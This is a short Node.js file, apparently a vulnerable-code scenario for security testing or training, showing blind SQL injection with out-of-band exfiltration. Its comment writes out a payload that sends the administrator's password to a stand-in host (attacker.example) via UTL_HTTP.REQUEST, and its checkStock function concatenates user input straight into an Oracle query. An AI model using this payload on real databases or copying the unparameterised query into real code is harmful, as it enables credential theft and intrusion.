// Scenario: Blind SQL injection with out-of-band data exfiltration.
// Same concatenated sink as the OOB-interaction case, but instead of just confirming the
// callback, the attacker encodes extracted data into the callback destination itself,
// e.g. `' UNION SELECT UTL_HTTP.REQUEST('http://' || (SELECT password FROM users WHERE
// username='administrator') || '.attacker.example/') FROM dual--`, exfiltrating the
// value via the DNS/HTTP request the database makes.
const oracledb = require("oracledb");

async function checkStock(connection, productId, storeId) {
  const sql = `SELECT quantity FROM stock WHERE product_id = '${productId}' AND store_id = '${storeId}'`;
  return connection.execute(sql);
}

module.exports = { checkStock };
